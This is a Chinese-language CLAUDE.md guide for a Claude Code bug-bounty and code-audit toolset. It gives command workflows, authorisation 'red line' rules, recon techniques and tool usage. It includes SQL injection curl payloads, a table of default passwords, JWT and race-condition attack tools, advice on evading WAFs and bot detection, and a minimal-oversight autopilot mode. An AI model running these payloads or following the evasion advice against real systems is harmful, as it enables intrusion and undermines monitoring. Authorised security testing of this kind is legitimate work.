# Bai-codeagent — Claude Code SRC 漏洞挖掘指南

本项目是一个基于 Claude Code 的 **全自动 SRC 漏洞挖掘 + 开源代码审计** 工具集。
分为两个模块：白盒代码审计（原有功能）和黑盒 SRC 挖掘（claude-hunt/）。

---

## 快速开始

```bash
# 1. 安装扫描工具
chmod +x claude-hunt/install_tools.sh && bash claude-hunt/install_tools.sh

# 2. 安装 Claude Code skills 和 commands
chmod +x claude-hunt/install.sh && bash claude-hunt/install.sh

# 3. 启动 Claude Code
claude

# 4. 核心四命令
/recon target.com          # 信息搜集（子域名、端口、URL、JS分析）
/hunt target.com           # 漏洞挖掘（XSS、SQLi、IDOR、SSRF等）
/validate                  # 验证漏洞（7问门控）
/report                    # 生成报告（补天/漏洞盒子/HackerOne格式）

# 5. 全自动模式
/autopilot target.com --normal   # AI 自动跑完全流程
```

---

## 项目结构

```
Bai-codeagent/
├── server.js                    # Web 面板服务器
├── public/                      # Web 前端（含 src-hunt.html）
├── src/                         # 白盒代码审计模块
│   ├── agents/                  # 审计代理（CVE审计 + SRC辅助）
│   ├── config/                  # 审计规则 + SRC漏洞模板
│   └── services/                # 报告生成、红线系统、信息搜集
├── claude-hunt/                 # 黑盒 SRC 挖掘模块（Claude Code 驱动）
│   ├── tools/                   # 自动化脚本（recon_engine.sh, hunt.py, vuln_scanner.sh）
│   ├── commands/                # Claude Code slash commands（/recon, /hunt, /report...）
│   ├── agents/                  # AI Agent 定义（autopilot, recon-agent, report-writer...）
│   ├── skills/                  # 漏洞知识库（20种Web2 + 10种Web3漏洞类）
│   ├── rules/                   # 猎手规则（始终生效）
│   ├── memory/                  # 跨会话记忆系统（pattern_db, audit_log）
│   ├── mcp/                     # MCP 集成（Burp Suite, HackerOne）
│   ├── install.sh               # 安装 skills 到 ~/.claude/
│   └── install_tools.sh         # 安装扫描工具（subfinder, nuclei, httpx...）
├── .claude/settings.json        # Claude Code 配置
└── CLAUDE.md                    # 本文件（Claude Code 自动加载）
```

---

## 中国 SRC 红线规则（始终生效）

### 绝对不能做的事

1. **不用自动化扫描器对实名SRC目标扫** — sqlmap/awvs/nessus/dirsearch 批量跑会产生大量异常请求，WAF会记录你的IP+账号，实名制下直接追溯到人。用 Fiddler/Burp 手动逐个测。
2. **不把目标网站打崩** — 并发控制在 10-50 次，不对生产环境做压力测试。一旦导致服务不可用=犯法。
3. **不涉及线上真实用户数据** — 最多用2个自己注册的账号验证，不查看/下载/传播真实用户的任何数据。
4. **不使用在线XSS平台** — 如果有人使用同款平台被执法，平台日志里你也会被查。自己搭或用 alert(1) 截图证明。
5. **没授权不碰** — 只在 SRC 授权范围内测试。不在列表里的资产碰了就是违法。
6. **BC站/黄赌毒不碰** — 博彩/赌博/色情相关网站，哪怕有漏洞也不碰。
7. **情报漏洞不做** — 截图举报类（删差评链、外挂销售、内鬼证据）不属于技术漏洞。
8. **数据库漏洞只读2-3行** — 证明能读就行，读多了=非法获取计算机信息系统数据罪。
9. **公益SRC谨慎** — 部分公益SRC会顺着排行榜/提交记录反向追查。
10. **不改数据/不删东西/不留后门** — 只读不写。修改数据=破坏计算机信息系统罪。
11. **不社工真实员工** — 钓鱼邮件/电话诈骗不在SRC收漏洞范围内。
12. **不测试核心业务高峰期** — 电商大促/支付系统忙时不测，出问题赔不起。
13. **越权只验证存在性** — 看到"能访问"就停，不要继续翻别人数据。
14. **所有操作全程录屏** — 万一被误会，录屏是你的证据。

### 测试规范

- SQL注入：AI手工构造payload验证（不用sqlmap等自动化工具，流量太大会被WAF记录+实名追溯）。只读2-3行证明存在即可。让Claude Code帮你手工构造union/盲注/时间盲注的payload。
- XSS：用 alert(1) 或截图证明即可
- 支付漏洞：选便宜商品，成功后立即取消订单，录全程视频
- 越权：只用自己注册的2个账号互相验证
- 并发：控制在10-50次，成功后立即停止
- SSRF：探测即可，不深入利用内网服务

---

## 中国 SRC 平台

| 平台 | 类型 | 备注 |
|------|------|------|
| 补天 SRC | 公益+企业 | 专属SRC可挖gov类 |
| 漏洞盒子 | 众测 | 金融类需养号 |
| 火线平台 | 众测 | 比较卷 |
| 字节跳动 SRC | 企业 | 赏金高，资产多 |
| 美团 SRC | 企业 | 业务复杂 |
| B站 SRC | 企业 | 业务功能多，适合逻辑漏洞 |
| 阿里巴巴 SRC | 企业 | 电商支付逻辑 |
| 腾讯 SRC | 企业 | 社交+游戏+支付 |

---

## 资产搜集方法（中国特色）

### 企业资产穿透
1. 企查查/天眼查搜索公司名 → 查看股权穿透图
2. 占股超过51%的子公司算作本公司资产
3. 查看知识产权：备案网站、APP、小程序、公众号、软件著作权
4. 七麦数据(qimai.cn)搜索公司旗下APP
5. 小蓝本(sou.xiaolanben.com)搜集公司信息

### FOFA 语法（常用）
```
domain="xxx.com" && (title="管理" || title="后台" || title="平台")
body="<!--统计代码，可删除-->" && header=200
cert="目标域名"
```

### 谷歌语法
```
site:xxx.com inurl:login
intitle:管理 OR intitle:后台 site:xxx.com
site:xxx.com filetype:xls
site:xxx.com "手机号" OR "身份证"
```

---

## 漏洞挖掘重点（SRC高价值目标）

### 功能点 → 漏洞映射

| 功能点 | 优先测试 |
|--------|----------|
| 支付/结算 | 负数/溢出/取消再支付/赠品篡改 |
| 登录/注册 | SQL注入/任意用户注册/验证码绕过 |
| 个人资料 | 水平越权(IDOR)/垂直越权 |
| 订单管理 | IDOR/取消再支付/并发 |
| 优惠券/积分 | 并发领取/不同金额并发 |
| 提现/转账 | 并发提现/金额篡改 |
| 短信/验证码 | 响应泄露/爆破/修改返回包/轰炸 |
| 文件上传 | 类型绕过/路径穿越/webshell |
| 图片/URL | SSRF(内网探测/云元数据) |
| API接口 | 越权/Key泄露/未授权 |

### int最大值溢出公式
```
单价 × 数量 > 2147483647（int32最大值）时溢出
2147483647 / 单价 = 最大安全数量
最大安全数量 + 1 = 溢出数量
溢出后实付 = (数量 × 单价) - 2147483648
```

### 并发测试方法（Fiddler）
1. 方法一：Shift+U 同时发送多次相同请求
2. 方法二：开启拦截模式 → 客户端多次操作 → 一次性放行（适合有随机参数的情况）

---

## 常见默认口令

| 系统 | 用户名 | 密码 |
|------|--------|------|
| k8s控制台 | admin | P@88w0rd |
| zabbix | admin | zabbix |
| grafana | admin | admin |
| nacos | nacos | nacos |
| tomcat | tomcat | tomcat |
| weblogic | weblogic | weblogic |
| rabbitmq | admin | guest |
| druid | admin | 123456 |
| 若依 | admin | admin123 |

---

## 报告格式（中国SRC标准）

```markdown
# 漏洞标题

**平台**: 补天SRC / 漏洞盒子
**目标**: xxx.com
**类型**: 业务逻辑 / 越权 / 支付
**严重程度**: 严重 / 高危 / 中危 / 低危

## 一、漏洞概述
通过修改XXX功能的XXX参数，可以实现XXX效果。

## 二、复现步骤
1. 打开目标网站 xxx.com
2. 进入XX功能页面
3. 使用Fiddler抓包，修改包中price参数为-1
4. 放行数据包，即可成功以负数金额下单

### 数据包
POST /api/order/create HTTP/1.1
Host: xxx.com
Content-Type: application/json

{"productId":"xxx","qty":-1,"price":0.01}

## 三、危害说明
该漏洞可导致攻击者以极低价格购买商品，造成平台经济损失。

## 四、修复建议
建议在服务端对金额和数量参数进行严格校验，包括类型、范围、符号检查。
```

---

## CNVD 双提交（一洞两吃）

同一个开源CMS的洞可以同时拿 CVE + CNVD：
1. 白盒审计发现0day → 写英文报告 → 交NVD拿CVE
2. 同一个洞改成中文报告 → 交CNVD拿编号
3. 两个体系互不冲突，工作量只多翻译半小时

---

## Claude Code 工作流

### 单目标手动流程
```
/recon target.com          → 信息搜集
/hunt target.com           → 漏洞测试
/validate                  → 验证漏洞
/report                    → 生成报告
```

### 全自动流程
```
/autopilot target.com --normal   → AI自动跑全流程，验证后暂停等你确认
/autopilot target.com --yolo     → 最少干预（仍需报告审批）
```

### 继续上次
```
/pickup target.com         → 继续上次未完成的目标
/remember                  → 保存当前发现到记忆系统
```

### 辅助命令
```
/surface target.com        → 排序攻击面（优先测高价值目标）
/intel target.com          → 查询相关CVE和已披露报告
/chain                     → 发现一个洞后，自动查找关联漏洞链
/scope target.com          → 检查目标是否在授权范围内
/arsenal                   → 查看已安装的工具
```

---

## 关键规则（始终生效）

1. **先读scope** — 一个越界请求就可能被ban
2. **只挖真实可利用的洞** — "理论上可能"不算洞
3. **7问门控** — 写报告前必须过7个问题
4. **5分钟规则** — 没进展就换目标
5. **深度优于广度** — 一个目标吃透 > 十个目标浅试
6. **兄弟接口规则** — 一个接口有洞，旁边的接口大概率也有
7. **跟着钱走** — 支付/钱包/退款 = 开发者最多shortcuts的地方
8. **20分钟轮换** — 每20分钟问自己"有进展吗？"没有就换
9. **验证后再写报告** — /validate 通过后才花时间写

---

## 安装依赖

```bash
# 系统工具（Linux/Kali）
sudo apt install golang python3 nodejs jq nmap

# 安全工具（自动安装）
bash claude-hunt/install_tools.sh

# Claude Code skills
bash claude-hunt/install.sh
```

### 需要的工具清单
- subfinder（子域名枚举）
- httpx（HTTP探测）
- nuclei（漏洞扫描模板）
- ffuf（目录爆破）
- nmap（端口扫描）
- gau（历史URL）
- dalfox（XSS检测）
- katana（爬虫）

---

## Web面板（可选）

```bash
npm start
# 访问 http://localhost:3000
# SRC挖掘面板: http://localhost:3000/src-hunt.html
```

Web面板提供：目标管理、信息搜集计划生成、漏洞模板推荐、报告生成、红线提醒。
适合不用 Claude Code 时的辅助工作。



---

## 自带渗透工具一览

### 信息搜集
| 工具 | 说明 | 用法 |
|------|------|------|
| subfinder | 子域名枚举 | `subfinder -d target.com` |
| httpx | HTTP存活探测+指纹 | `httpx -l subs.txt -silent -tech-detect` |
| katana | 爬虫（JS渲染友好） | `katana -u target.com -d 3` |
| gau | 历史URL搜集 | `echo target.com \| gau` |
| naabu | 端口扫描（快） | `naabu -host target.com -top-ports 1000` |
| kiterunner | 隐藏API发现 | `kr scan target.com -w routes.kite` |
| waybackurls | Wayback历史URL | `echo target.com \| waybackurls` |
| gowitness | 批量网页截图 | `gowitness file -f urls.txt` |
| wafw00f | WAF识别 | `wafw00f target.com` |

### 漏洞检测
| 工具 | 说明 | 用法 |
|------|------|------|
| nuclei | 模板化漏洞扫描 | `nuclei -u target.com -severity high,critical` |
| dalfox | XSS自动检测 | `dalfox pipe < urls_with_params.txt` |
| crlfuzz | CRLF注入检测 | `crlfuzz -u target.com` |
| subjack | 子域名接管 | `subjack -w subs.txt -t 20` |

### 业务逻辑漏洞（自写Python工具）
| 工具 | 文件 | 说明 |
|------|------|------|
| **并发竞态测试** | `race_tester.py` | 并发发请求检测提现/领券/签到竞态 |
| **越权自动对比** | `idor_diff.py` | 两账号对比检测IDOR/垂直越权/未授权 |
| **JWT攻击** | `jwt_attack.py` | alg:none/弱密钥爆破/payload篡改 |
| **JS信息提取** | `js_extractor.py` | 从JS提取API端点/密钥/Token |
| **截图识图** | `screenshot_ocr.py` | 验证码识别/页面分析/对比截图 |
| **UI控制** | `ui_controller.py` | 鼠标键盘自动化/滑块验证码/截屏 |
| **浏览器自动化** | `browser_auto.py` | Playwright自动登录/表单/Cookie提取/请求拦截 |

---

## UI 控制 / 鼠标键盘自动化

### ui_controller.py（桌面GUI控制）

依赖：`pip install pyautogui pillow`

```bash
# 全屏截图
python3 claude-hunt/tools/ui_controller.py --screenshot full -o screen.png

# 点击坐标
python3 claude-hunt/tools/ui_controller.py --click 500 300

# 输入文字
python3 claude-hunt/tools/ui_controller.py --type "admin123"

# 拖拽滑块验证码（从x=200拖到x=500）
python3 claude-hunt/tools/ui_controller.py --drag 200 300 500 300 --duration 0.5

# 找到图片并点击
python3 claude-hunt/tools/ui_controller.py --find-and-click login_button.png

# 组合键
python3 claude-hunt/tools/ui_controller.py --hotkey ctrl a

# 获取鼠标位置
python3 claude-hunt/tools/ui_controller.py --position
```

### browser_auto.py（无头浏览器自动化）

依赖：`pip install playwright && playwright install chromium`

```bash
# 访问并截图
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --screenshot page.png

# 自动登录
python3 claude-hunt/tools/browser_auto.py --url "https://target.com/login" \
  --fill "#username=admin" --fill "#password=123456" \
  --click "button[type=submit]" --wait 3 --screenshot logged_in.png

# 提取表单/Cookie/localStorage
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --extract forms
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --extract cookies
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --extract storage

# 拦截所有API请求
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --intercept -o api.json

# 通过代理（配合Fiddler/Burp）
python3 claude-hunt/tools/browser_auto.py --url "https://target.com" --proxy http://127.0.0.1:8888
```

---

## 截图识图配置

创建 `~/.config/screenshot_ocr.json`：
```json
{
  "provider": "qwen",
  "api_key": "你的通义千问key",
  "base_url": "https://dashscope.aliyuncs.com/compatible-mode/v1",
  "model": "qwen-vl-plus"
}
```

---

## 业务逻辑漏洞工具用法

### race_tester.py — 并发竞态

```bash
python3 claude-hunt/tools/race_tester.py \
  --url "https://target.com/api/withdraw" \
  --method POST \
  --headers '{"Cookie":"session=xxx","Content-Type":"application/json"}' \
  --body '{"amount":1}' \
  --threads 20
```

### idor_diff.py — 越权对比

```bash
python3 claude-hunt/tools/idor_diff.py \
  --url "https://target.com/api/user/{ID}/orders" \
  --ids "123,456" \
  --auth-a "Cookie: session=userA" \
  --auth-b "Cookie: session=userB" \
  --own-id 123
```

### jwt_attack.py — JWT攻击

```bash
python3 claude-hunt/tools/jwt_attack.py --token "eyJ..." --all \
  --verify-url "https://target.com/api/me"
```

### js_extractor.py — JS敏感信息

```bash
python3 claude-hunt/tools/js_extractor.py --crawl "https://target.com"
```

---

## 安装所有工具

```bash
# Linux/Kali/WSL
sudo bash claude-hunt/install_tools_linux.sh

# UI + 浏览器自动化
pip install pyautogui pillow playwright
playwright install chromium
```

---

## MCP Server 配置

编辑 `~/.claude/settings.json`：

```json
{
  "mcpServers": {
    "fiddler": {
      "command": "python3",
      "args": ["C:/路径/claude-hunt/mcp/fiddler-mcp/server.py"],
      "env": {"FIDDLER_EXPORT_DIR": "C:/Users/你/Documents/Fiddler2/Captures"}
    },
    "redops": {
      "command": "python3",
      "args": ["C:/路径/claude-hunt/mcp/redops-mcp/server.py"],
      "env": {"REDOPS_URL": "http://localhost:8000"}
    },
    "burp": {
      "command": "npx",
      "args": ["-y", "@anthropic/burp-mcp-server"],
      "env": {"BURP_API_KEY": "你的Key", "BURP_URL": "http://localhost:1337"}
    }
  }
}
```

---

## 国产 Nuclei 模板

```bash
nuclei -l targets.txt -t claude-hunt/tools/nuclei-templates-cn/ -severity critical,high
```

含：ThinkPHP RCE、泛微OA、用友NC、Nacos、若依、Shiro、Redis、Actuator、Druid、Swagger

---

## 注意事项

- 只在获得授权的情况下使用
- 遵守法律法规
- SRC测试不要影响线上业务
- 不对未授权目标发起扫描
- 并发测试控制在10-50次
- 数据库漏洞只读2-3行验证
- 不用在线XSS平台
- 最多用2个自己注册的账号



---

## 工具安全限速参数（对SRC目标必须加）

对SRC授权目标测试时，**所有工具必须加限速参数**，否则会触发WAF/风控/人机验证导致IP被封或账号被追溯。

### 原则：对SRC目标每秒不超过3-5个请求

| 工具 | 默认行为（危险） | SRC安全参数 | 说明 |
|------|-----------------|-------------|------|
| **nuclei** | 并发25线程，全模板 | `nuclei -l targets.txt -severity critical,high -rate-limit 5 -c 3` | 只扫高危+限速5/秒+3线程 |
| **ffuf** | 40线程爆破 | `ffuf -u URL/FUZZ -w dict.txt -t 3 -rate 5 -mc 200,301,302,403` | 3线程+限速5/秒 |
| **dalfox** | 多worker并发 | `dalfox pipe --worker 2 --delay 300 --timeout 10` | 2worker+每请求延迟300ms |
| **katana** | 快速爬取 | `katana -u target.com -d 2 -delay 1 -c 3` | 深度2+延迟1秒+3并发 |
| **httpx** | 50线程探测 | `httpx -l urls.txt -threads 5 -rate-limit 10` | 5线程+限速10/秒 |
| **naabu** | 快速端口扫描 | `naabu -host target.com -rate 100 -c 10` | 对单目标100/秒足够 |
| **gau/waybackurls** | 查第三方数据源 | 无需限速 | 不直接请求目标，安全 |
| **subfinder** | 查第三方数据源 | 无需限速 | 不直接请求目标，安全 |
| **race_tester.py** | 并发20-50 | `--threads 20` 已硬限制 | 一次测完就停，不反复跑 |
| **idor_diff.py** | 逐个请求 | 默认安全 | 每个ID只发1个请求 |
| **browser_auto.py** | 正常浏览速度 | 默认安全 | 和人操作一样 |

### 会触发人机验证的行为

1. **短时间大量404** — ffuf/dirsearch 目录爆破最容易触发
2. **相同参数大量重复请求** — nuclei 模板扫描
3. **异常User-Agent** — 默认Go/Python UA容易被识别
4. **无Cookie/Session的大量请求** — 看起来像爬虫
5. **非常规请求频率** — 正常人不会1秒点10次
6. **无头浏览器特征** — navigator.webdriver=true 会被检测

### 如何避免触发

- **加随机延迟** — 每个请求之间随机等0.5-2秒
- **带正常Cookie** — 先登录获取session再测试
- **用正常UA** — `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
- **通过代理** — Fiddler/Burp代理让流量看起来像正常浏览
- **分散时间** — 不要集中在一个时间段全部跑完
- **手工优先** — 对SRC目标，能手工测就手工测

### Claude Code 自动化时的安全策略

当 Claude Code 用 `/hunt` 或 `/autopilot` 时，应该：

1. 先用 `wafw00f` 检测目标是否有WAF
2. 如果有WAF：所有工具加最严格限速（每秒1-2个请求）
3. 如果无WAF：可以稍微快一点（每秒5-10个请求）
4. SQL注入：**不用任何自动化工具**，让AI逐个手工构造payload通过curl发送
5. 并发测试：一次测完立即停止，不反复验证
6. 发现被ban（全是403/429）：立即停止，等待或换IP

### SQL注入的正确做法（AI手工注入）

**不要：**
```bash
sqlmap -u "http://target.com/page?id=1" --dbs  # ❌ 几百个请求瞬间打过去
```

**应该：**
```bash
# 1. 先判断是否有注入（1个请求）
curl "http://target.com/page?id=1' AND 1=1--" -H "Cookie: session=xxx"

# 2. 确认后手工构造payload（1个请求）
curl "http://target.com/page?id=1' UNION SELECT 1,2,3--" -H "Cookie: session=xxx"

# 3. 读取数据库名（1个请求）
curl "http://target.com/page?id=1' UNION SELECT 1,database(),3--" -H "Cookie: session=xxx"

# 4. 证明存在即可，截图写报告
# 总共只发了3-4个请求，WAF根本察觉不到
```

让 Claude Code 帮你构造这些 payload，它比 sqlmap 聪明——能根据报错信息动态调整注入方式，而且每次只发1个请求。
